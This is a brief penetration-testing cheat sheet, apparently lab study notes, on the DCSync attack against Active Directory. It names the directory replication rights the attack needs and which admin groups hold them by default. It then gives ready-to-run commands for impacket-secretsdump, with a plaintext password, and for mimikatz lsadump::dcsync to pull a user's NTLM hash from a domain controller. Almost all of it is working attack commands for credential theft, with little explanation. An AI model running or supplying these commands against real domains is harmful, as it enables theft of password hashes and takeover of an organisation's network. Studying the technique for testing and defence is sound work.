***
**Replicating Directory Changes / Replicating Directory Changes All / Replicating Directory Changes in Filtered Set rights**
Domain Admins/Enterprise Admins/Administrators group By Default
# Impacket
```bash
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```
# mimikatz
```powershell
.\mimikatz.exe
lsadump::dcsync /user:corp\dave #获取dave用户的NTLM hash
```